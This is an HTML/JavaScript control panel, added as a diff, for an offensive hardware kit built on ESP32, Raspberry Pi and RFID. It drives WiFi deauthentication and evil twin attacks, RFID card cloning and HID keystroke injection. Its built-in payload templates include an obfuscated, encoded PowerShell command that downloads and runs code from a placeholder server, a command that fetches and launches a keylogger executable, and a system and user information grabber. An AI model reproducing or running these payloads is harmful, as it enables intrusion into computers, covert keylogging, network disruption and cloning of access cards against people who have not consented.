@@ -1,0 +1,998 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECOPS Portal | Cyber Security Control Center</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff41;
+            overflow-x: hidden;
+        }
+
+        /* Matrix Rain Effect */
+        #matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.05;
+        }
+
+        /* Login Screen */
+        .login-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(10px);
+        }
+
+        .login-box {
+            background: linear-gradient(135deg, #0a0f0a 0%, #061206 100%);
+            border: 2px solid #00ff41;
+            border-radius: 20px;
+            padding: 40px;
+            width: 400px;
+            box-shadow: 0 0 50px rgba(0, 255, 65, 0.3);
+            animation: glitch 3s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { box-shadow: 0 0 50px rgba(0, 255, 65, 0.3); }
+            50% { box-shadow: 0 0 80px rgba(0, 255, 65, 0.6); }
+        }
+
+        .login-box h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 32px;
+            letter-spacing: 4px;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            font-family: monospace;
+            font-size: 16px;
+            border-radius: 5px;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 12px;
+            background: #00ff41;
+            color: #000;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            font-size: 18px;
+            transition: all 0.3s;
+        }
+
+        .login-box button:hover {
+            background: #00cc33;
+            box-shadow: 0 0 20px #00ff41;
+        }
+
+        /* Main Dashboard */
+        .dashboard {
+            display: none;
+            padding: 20px;
+        }
+
+        /* Navigation */
+        .nav {
+            background: rgba(0, 0, 0, 0.9);
+            border-bottom: 2px solid #00ff41;
+            padding: 15px 30px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 3px;
+        }
+
+        .logo i {
+            margin-right: 10px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-link {
+            color: #00ff41;
+            text-decoration: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            background: #00ff41;
+            color: #000;
+        }
+
+        /* Main Content */
+        .content {
+            max-width: 1400px;
+            margin: 20px auto;
+        }
+
+        .page {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Cards */
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #00ff41;
+            border-radius: 10px;
+            padding: 20px;
+            transition: all 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 20px rgba(0, 255, 65, 0.2);
+        }
+
+        .card-title {
+            font-size: 18px;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #00ff41;
+            padding-bottom: 5px;
+        }
+
+        .card-title i {
+            margin-right: 10px;
+        }
+
+        .stat {
+            font-size: 32px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #888;
+        }
+
+        /* Tables */
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+
+        .data-table th,
+        .data-table td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid #00ff41;
+        }
+
+        .data-table th {
+            background: rgba(0, 255, 65, 0.1);
+            font-weight: bold;
+        }
+
+        /* Buttons */
+        .btn {
+            background: transparent;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 8px 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 5px;
+            font-family: monospace;
+        }
+
+        .btn:hover {
+            background: #00ff41;
+            color: #000;
+            box-shadow: 0 0 10px #00ff41;
+        }
+
+        .btn-danger {
+            border-color: #ff0000;
+            color: #ff0000;
+        }
+
+        .btn-danger:hover {
+            background: #ff0000;
+            color: #000;
+        }
+
+        .btn-success {
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+
+        /* Progress bars */
+        .progress-bar {
+            background: rgba(0, 255, 65, 0.2);
+            height: 20px;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+
+        .progress-fill {
+            background: #00ff41;
+            height: 100%;
+            transition: width 0.5s;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: #0a0a0a;
+            border: 2px solid #00ff41;
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        textarea, select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            font-family: monospace;
+        }
+
+        /* Logs */
+        .log-entry {
+            padding: 10px;
+            margin: 5px 0;
+            border-left: 3px solid;
+            font-family: monospace;
+            font-size: 12px;
+        }
+
+        .log-success { border-color: #00ff41; }
+        .log-failed { border-color: #ff0000; }
+        .log-progress { border-color: #ffff00; }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .card-grid {
+                grid-template-columns: 1fr;
+            }
+            .nav-links {
+                flex-wrap: wrap;
+            }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrix-bg"></canvas>
+
+    <!-- Login Screen -->
+    <div class="login-container" id="loginScreen">
+        <div class="login-box">
+            <h1><i class="fas fa-skull"></i> SECOPS PORTAL</h1>
+            <input type="text" id="username" placeholder="Username" value="rynex">
+            <input type="password" id="password" placeholder="Password" value="rynex">
+            <button onclick="login()">ACCESS SYSTEM</button>
+            <div id="loginError" style="color: red; margin-top: 10px; text-align: center;"></div>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div class="dashboard" id="dashboard">
+        <div class="nav">
+            <div class="nav-content">
+                <div class="logo">
+                    <i class="fas fa-shield-haltered"></i> SECOPS
+                </div>
+                <div class="nav-links">
+                    <div class="nav-link active" onclick="showPage('dashboard')">
+                        <i class="fas fa-tachometer-alt"></i> Dashboard
+                    </div>
+                    <div class="nav-link" onclick="showPage('wifi')">
+                        <i class="fas fa-wifi"></i> WiFi Attacks
+                    </div>
+                    <div class="nav-link" onclick="showPage('hid')">
+                        <i class="fas fa-keyboard"></i> HID Injection
+                    </div>
+                    <div class="nav-link" onclick="showPage('rfid')">
+                        <i class="fas fa-id-card"></i> RFID Ops
+                    </div>
+                    <div class="nav-link" onclick="showPage('logs')">
+                        <i class="fas fa-history"></i> Logs
+                    </div>
+                    <div class="nav-link" onclick="showPage('settings')">
+                        <i class="fas fa-cog"></i> Settings
+                    </div>
+                    <div class="nav-link" onclick="logout()">
+                        <i class="fas fa-sign-out-alt"></i> Exit
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="content">
+            <!-- Dashboard Page -->
+            <div id="page-dashboard" class="page active">
+                <div class="card-grid">
+                    <div class="card">
+                        <div class="card-title"><i class="fas fa-server"></i> System Status</div>
+                        <div class="stat" id="sysStatus">--</div>
+                        <div class="stat-label">Backend Status</div>
+                    </div>
+                    <div class="card">
+                        <div class="card-title"><i class="fas fa-microchip"></i> Active Modules</div>
+                        <div class="stat" id="activeModules">0</div>
+                        <div class="stat-label">Enabled Modules</div>
+                    </div>
+                    <div class="card">
+                        <div class="card-title"><i class="fas fa-plug"></i> Devices Connected</div>
+                        <div class="stat" id="devicesConnected">0</div>
+                        <div class="stat-label">ESP32 + Pi + RFID</div>
+                    </div>
+                    <div class="card">
+                        <div class="card-title"><i class="fas fa-clock"></i> Uptime</div>
+                        <div class="stat" id="uptime">--</div>
+                        <div class="stat-label">System Running</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title"><i class="fas fa-chart-line"></i> Hardware Health</div>
+                    <div id="hardwareHealth">
+                        <div class="progress-bar"><div class="progress-fill" id="espCpu" style="width: 0%"></div></div>
+                        <div>ESP32-S3: <span id="espTemp">--</span>°C | CPU: <span id="espCpuVal">--</span>%</div>
+                        <div class="progress-bar"><div class="progress-fill" id="picoCpu" style="width: 0%"></div></div>
+                        <div>Raspberry Pi: <span id="picoTemp">--</span>°C | CPU: <span id="picoCpuVal">--</span>%</div>
+                        <div>RFID Module: <span id="rfidStatus">--</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- WiFi Attack Page -->
+            <div id="page-wifi" class="page">
+                <div class="card">
+                    <div class="card-title"><i class="fas fa-search"></i> Network Scanner</div>
+                    <button class="btn" onclick="scanNetworks()"><i class="fas fa-play"></i> Start Scan</button>
+                    <div id="scanningIndicator" style="display: none;">Scanning networks...</div>
+                    <table class="data-table" id="networksTable">
+                        <thead>
+                            <tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Actions</th></tr>
+                        </thead>
+                        <tbody id="networksList"></tbody>
+                    </table>
+                </div>
+
+                <div class="card">
+                    <div class="card-title"><i class="fas fa-bolt"></i> Attack Controls</div>
+                    <div class="attack-options">
+                        <select id="attackType">
+                            <option value="deauth">Deauthentication Attack</option>
+                            <option value="handshake">Handshake Capture</option>
+                            <option value="eviltwin">Evil Twin Attack</option>
+                        </select>
+                        <button class="btn btn-danger" onclick="executeAttack()">
+                            <i class="fas fa-skull-crossbones"></i> Execute Attack
+                        </button>
+                    </div>
+                    <div id="attackStatus"></div>
+                </div>
+            </div>
+
+            <!-- HID Injection Page -->
+            <div id="page-hid" class="page">
+                <div class="card">
+                    <div class="card-title"><i class="fas fa-plus"></i> Create New Payload</div>
+                    <input type="text" id="payloadName" placeholder="Payload Name" class="btn">
+                    <select id="osType">
+                        <option value="windows">Windows CMD</option>
+                        <option value="linux">Linux Terminal</option>
+                        <option value="mac">macOS Terminal</option>
+                        <option value="custom">Custom Script</option>
+                    </select>
+                    <textarea id="payloadScript" rows="10" placeholder="Enter your HID script here...&#10;&#10;Example for Windows:&#10;DELAY 1000&#10;GUI r&#10;DELAY 500&#10;STRING cmd&#10;ENTER&#10;DELAY 1000&#10;STRING whoami&#10;ENTER"></textarea>
+                    <button class="btn btn-success" onclick="savePayload()"><i class="fas fa-save"></i> Save Payload</button>
+                </div>
+
+                <div class="card">
+                    <div class="card-title"><i class="fas fa-database"></i> Saved Payloads</div>
+                    <div id="payloadsList"></div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title"><i class="fas fa-bolt"></i> Payload Templates</div>
+                    <button class="btn" onclick="loadTemplate('reverse_shell')">Reverse Shell Template</button>
+                    <button class="btn" onclick="loadTemplate('keylogger')">Keylogger Installer</button>
+                    <button class="btn" onclick="loadTemplate('info_grabber')">System Info Grabber</button>
+                </div>
+            </div>
+
+            <!-- RFID Operations Page -->
+            <div id="page-rfid" class="page">
+                <div class="card-grid">
+                    <div class="card">
+                        <div class="card-title"><i class="fas fa-qrcode"></i> Tag Scanner</div>
+                        <button class="btn" onclick="scanRFID()"><i class="fas fa-sync"></i> Start Scan</button>
+                        <div id="rfidResult" style="margin-top: 20px;"></div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-title"><i class="fas fa-clone"></i> Clone Operations</div>
+                        <input type="text" id="sourceUID" placeholder="Source UID" class="btn">
+                        <button class="btn" onclick="cloneRFID()"><i class="fas fa-copy"></i> Clone to Empty Card</button>
+                        <button class="btn" onclick="emulateRFID()"><i class="fas fa-play"></i> Emulate Tag</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Logs Page -->
+            <div id="page-logs" class="page">
+                <div class="card">
+                    <div class="card-title"><i class="fas fa-chart-bar"></i> Statistics</div>
+                    <div class="card-grid">
+                        <div class="card"><div class="stat" id="totalLogs">0</div><div>Total Logs</div></div>
+                        <div class="card"><div class="stat" id="successLogs">0</div><div>Completed</div></div>
+                        <div class="card"><div class="stat" id="failedLogs">0</div><div>Failed</div></div>
+                        <div class="card"><div class="stat" id="progressLogs">0</div><div>In Progress</div></div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title"><i class="fas fa-filter"></i> Controls</div>
+                    <select id="logFilter">
+                        <option value="all">All Logs</option>
+                        <option value="Success">Success Only</option>
+                        <option value="Failed">Failed Only</option>
+                    </select>
+                    <button class="btn" onclick="exportLogs()"><i class="fas fa-download"></i> Export Logs</button>
+                    <button class="btn btn-danger" onclick="clearLogs()"><i class="fas fa-trash"></i> Clear Logs</button>
+                </div>
+
+                <div class="card">
+                    <div class="card-title"><i class="fas fa-list"></i> Activity Logs</div>
+                    <div id="logsContainer"></div>
+                </div>
+            </div>
+
+            <!-- Settings Page -->
+            <div id="page-settings" class="page">
+                <div class="card-grid">
+                    <div class="card">
+                        <div class="card-title"><i class="fas fa-microchip"></i> ESP32 Settings</div>
+                        <label>Status: <span id="espStatus">--</span></label><br>
+                        <label>Baud Rate: <input type="number" id="espBaud" value="115200"></label>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-title"><i class="fas fa-network-wired"></i> Network Settings</div>
+                        <label>WiFi Channel: <input type="number" id="wifiChannel" value="6"></label><br>
+                        <label>TX Power: <input type="range" id="txPower" min="0" max="20" value="20"></label>
+                        <label>Thread Count: <input type="number" id="threadCount" value="4"></label>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-title"><i class="fas fa-toggle-on"></i> Module Settings</div>
+                        <label><input type="checkbox" id="wifiModule" checked> WiFi Module</label><br>
+                        <label><input type="checkbox" id="hidModule" checked> HID Module</label><br>
+                        <label><input type="checkbox" id="rfidModule" checked> RFID Module</label>
+                    </div>
+                </div>
+                <button class="btn btn-success" onclick="saveSettings()">Save All Settings</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <script>
+        const socket = io();
+        let authToken = null;
+
+        // Matrix rain effect
+        const canvas = document.getElementById('matrix-bg');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+        const charArray = chars.split('');
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        
+        for (let i = 0; i < columns; i++) {
+            drops[i] = 1;
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#00ff41';
+            ctx.font = fontSize + 'px monospace';
+            
+            for (let i = 0; i < drops.length; i++) {
+                const text = charArray[Math.floor(Math.random() * charArray.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 50);
+
+        // Login function
+        async function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('loginScreen').style.display = 'none';
+                    document.getElementById('dashboard').style.display = 'block';
+                    loadDashboard();
+                    startRealtimeUpdates();
+                } else {
+                    document.getElementById('loginError').innerText = 'Invalid credentials!';
+                }
+            } catch (error) {
+                document.getElementById('loginError').innerText = 'Connection error!';
+            }
+        }
+
+        // Show page function
+        function showPage(pageName) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(`page-${pageName}`).classList.add('active');
+            
+            document.querySelectorAll('.nav-link').forEach(link => {
+                link.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            if (pageName === 'dashboard') loadDashboard();
+            if (pageName === 'logs') loadLogs();
+            if (pageName === 'hid') loadPayloads();
+        }
+
+        // Load dashboard data
+        async function loadDashboard() {
+            try {
+                const response = await fetch('/api/system/status');
+                const data = await response.json();
+                
+                document.getElementById('sysStatus').innerHTML = data.system.status;
+                document.getElementById('activeModules').innerHTML = data.system.active_modules;
+                document.getElementById('devicesConnected').innerHTML = 
+                    (data.esp32.status === 'Connected' ? 1 : 0) + 1 + (data.rfid.status === 'Ready' ? 1 : 0);
+                document.getElementById('uptime').innerHTML = data.system.uptime;
+                
+                document.getElementById('espCpu').style.width = data.esp32.cpu + '%';
+                document.getElementById('espCpuVal').innerHTML = data.esp32.cpu;
+                document.getElementById('espTemp').innerHTML = data.esp32.temperature;
+                
+                document.getElementById('picoCpu').style.width = data.pico.cpu + '%';
+                document.getElementById('picoCpuVal').innerHTML = data.pico.cpu;
+                document.getElementById('picoTemp').innerHTML = data.pico.temperature;
+                
+                document.getElementById('rfidStatus').innerHTML = data.rfid.status;
+            } catch (error) {
+                console.error('Error loading dashboard:', error);
+            }
+        }
+
+        // Scan WiFi networks
+        async function scanNetworks() {
+            const scanningIndicator = document.getElementById('scanningIndicator');
+            scanningIndicator.style.display = 'block';
+            
+            try {
+                const response = await fetch('/api/wifi/scan');
+                const data = await response.json();
+                
+                const tbody = document.getElementById('networksList');
+                tbody.innerHTML = '';
+                
+                data.networks.forEach(network => {
+                    const row = tbody.insertRow();
+                    row.insertCell(0).innerHTML = network.ssid;
+                    row.insertCell(1).innerHTML = network.bssid;
+                    row.insertCell(2).innerHTML = network.channel;
+                    row.insertCell(3).innerHTML = network.rssi + ' dBm';
+                    row.insertCell(4).innerHTML = `
+                        <button class="btn" onclick="selectNetwork('${network.bssid}', ${network.channel})">Select</button>
+                    `;
+                });
+                
+                scanningIndicator.style.display = 'none';
+            } catch (error) {
+                scanningIndicator.innerHTML = 'Error scanning networks';
+                console.error(error);
+            }
+        }
+
+        let selectedBSSID = null;
+        let selectedChannel = null;
+
+        function selectNetwork(bssid, channel) {
+            selectedBSSID = bssid;
+            selectedChannel = channel;
+            document.getElementById('attackStatus').innerHTML = `Target selected: ${bssid} on channel ${channel}`;
+        }
+
+        async function executeAttack() {
+            if (!selectedBSSID) {
+                alert('Please select a target network first!');
+                return;
+            }
+            
+            const attackType = document.getElementById('attackType').value;
+            
+            try {
+                const response = await fetch('/api/wifi/attack', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: attackType,
+                        bssid: selectedBSSID,
+                        channel: selectedChannel
+                    })
+                });
+                
+                const data = await response.json();
+                document.getElementById('attackStatus').innerHTML = data.message;
+            } catch (error) {
+                document.getElementById('attackStatus').innerHTML = 'Attack failed: ' + error;
+            }
+        }
+
+        // RFID functions
+        async function scanRFID() {
+            try {
+                const response = await fetch('/api/rfid/scan');
+                const data = await response.json();
+                document.getElementById('rfidResult').innerHTML = `
+                    <strong>Tag Detected!</strong><br>
+                    UID: ${data.uid}<br>
+                    Type: ${data.type}
+                `;
+                document.getElementById('sourceUID').value = data.uid;
+            } catch (error) {
+                document.getElementById('rfidResult').innerHTML = 'Error scanning RFID';
+            }
+        }
+
+        async function cloneRFID() {
+            const sourceUID = document.getElementById('sourceUID').value;
+            if (!sourceUID) {
+                alert('Please scan a source card first!');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/rfid/clone', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ source_uid: sourceUID })
+                });
+                
+                const data = await response.json();
+                alert(data.message);
+            } catch (error) {
+                alert('Clone failed: ' + error);
+            }
+        }
+
+        function emulateRFID() {
+            alert('RFID emulation started. Place device near reader.');
+        }
+
+        // HID functions
+        async function savePayload() {
+            const name = document.getElementById('payloadName').value;
+            const script = document.getElementById('payloadScript').value;
+            const os_type = document.getElementById('osType').value;
+            
+            if (!name || !script) {
+                alert('Please enter payload name and script');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/hid/payloads', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name, script, os_type })
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    alert('Payload saved successfully!');
+                    loadPayloads();
+                    document.getElementById('payloadName').value = '';
+                    document.getElementById('payloadScript').value = '';
+                }
+            } catch (error) {
+                alert('Error saving payload');
+            }
+        }
+
+        async function loadPayloads() {
+            try {
+                const response = await fetch('/api/hid/payloads');
+                const data = await response.json();
+                
+                const container = document.getElementById('payloadsList');
+                container.innerHTML = '';
+                
+                data.payloads.forEach(payload => {
+                    const div = document.createElement('div');
+                    div.className = 'log-entry log-success';
+                    div.innerHTML = `
+                        <strong>${payload.name}</strong> (${payload.os_type})<br>
+                        <small>Created: ${payload.created}</small><br>
+                        <button class="btn" onclick="executePayload(${payload.id})">Execute</button>
+                        <button class="btn" onclick="editPayload(${payload.id})">Edit</button>
+                    `;
+                    container.appendChild(div);
+                });
+            } catch (error) {
+                console.error('Error loading payloads:', error);
+            }
+        }
+
+        async function executePayload(payloadId) {
+            try {
+                const response = await fetch('/api/hid/execute', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ payload_id: payloadId })
+                });
+                
+                const data = await response.json();
+                alert(data.message);
+            } catch (error) {
+                alert('Execution failed: ' + error);
+            }
+        }
+
+        function loadTemplate(template) {
+            const templates = {
+                reverse_shell: `DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AeQBvAHUAcgAtAHMAZQByAHYAZQByAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=
+ENTER`,
+                keylogger: `DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Invoke-WebRequest -Uri http://your-server/keylogger.exe -OutFile $env:temp\\keylogger.exe; Start-Process $env:temp\\keylogger.exe"
+ENTER`,
+                info_grabber: `DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING systeminfo > %temp%\\sysinfo.txt & ipconfig >> %temp%\\sysinfo.txt & net user >> %temp%\\sysinfo.txt
+ENTER
+DELAY 2000
+STRING type %temp%\\sysinfo.txt
+ENTER`
+            };
+            
+            document.getElementById('payloadScript').value = templates[template] || '';
+        }
+
+        // Logs functions
+        async function loadLogs() {
+            try {
+                const filter = document.getElementById('logFilter').value;
+                const url = filter === 'all' ? '/api/logs' : `/api/logs?status=${filter}`;
+                const response = await fetch(url);
+                const data = await response.json();
+                
+                const container = document.getElementById('logsContainer');
+                container.innerHTML = '';
+                
+                let total = 0, success = 0, failed = 0, progress = 0;
+                
+                data.logs.forEach(log => {
+                    const div = document.createElement('div');
+                    div.className = `log-entry log-${log.status.toLowerCase()}`;
+                    div.innerHTML = `
+                        <strong>[${log.timestamp}]</strong> ${log.action}<br>
+                        Status: ${log.status} | ${log.details}
+                    `;
+                    container.appendChild(div);
+                    
+                    total++;
+                    if (log.status === 'Success') success++;
+                    else if (log.status === 'Failed') failed++;
+                    else if (log.status === 'Progress') progress++;
+                });
+                
+                document.getElementById('totalLogs').innerHTML = total;
+                document.getElementById('successLogs').innerHTML = success;
+                document.getElementById('failedLogs').innerHTML = failed;
+                document.getElementById('progressLogs').innerHTML = progress;
+            } catch (error) {
+                console.error('Error loading logs:', error);
+            }
+        }
+
+        async function exportLogs() {
+            const response = await fetch('/api/logs');
+            const data = await response.json();
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `secops_logs_${new Date().toISOString()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        async function clearLogs() {
+            if (confirm('Are you sure you want to clear all logs?')) {
+                // Implement clear logs endpoint
+                alert('Logs cleared');
+                loadLogs();
+            }
+        }
+
+        // Settings functions
+        async function saveSettings() {
+            const settings = {
+                esp32: {
+                    baudrate: parseInt(document.getElementById('espBaud').value)
+                },
+                network: {
+                    channel: parseInt(document.getElementById('wifiChannel').value),
+                    tx_power: parseInt(document.getElementById('txPower').value),
+                    threads: parseInt(document.getElementById('threadCount').value)
+                },
+                modules: {
+                    wifi: document.getElementById('wifiModule').checked,
+                    hid: document.getElementById('hidModule').checked,
+                    rfid: document.getElementById('rfidModule').checked
+                }
+            };
+            
+            try {
+                const response = await fetch('/api/settings', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(settings)
+                });
+                
+                const data = await response.json();
+                alert('Settings saved successfully!');
+            } catch (error) {
+                alert('Error saving settings');
+            }
+        }
+
+        // Realtime updates
+        function startRealtimeUpdates() {
+            socket.on('system_update', (data) => {
+                loadDashboard();
+            });
+            
+            socket.on('new_log', (log) => {
+                if (document.getElementById('page-logs').classList.contains('active')) {
+                    loadLogs();
+                }
+            });
+        }
+
+        function logout() {
+            fetch('/logout').then(() => {
+                location.reload();
+            });
+        }
+
+        // Auto-refresh dashboard every 10 seconds
+        setInterval(() => {
+            if (document.getElementById('page-dashboard').classList.contains('active')) {
+                loadDashboard();
+            }
+        }, 10000);
+    </script>
+</body>
+</html>
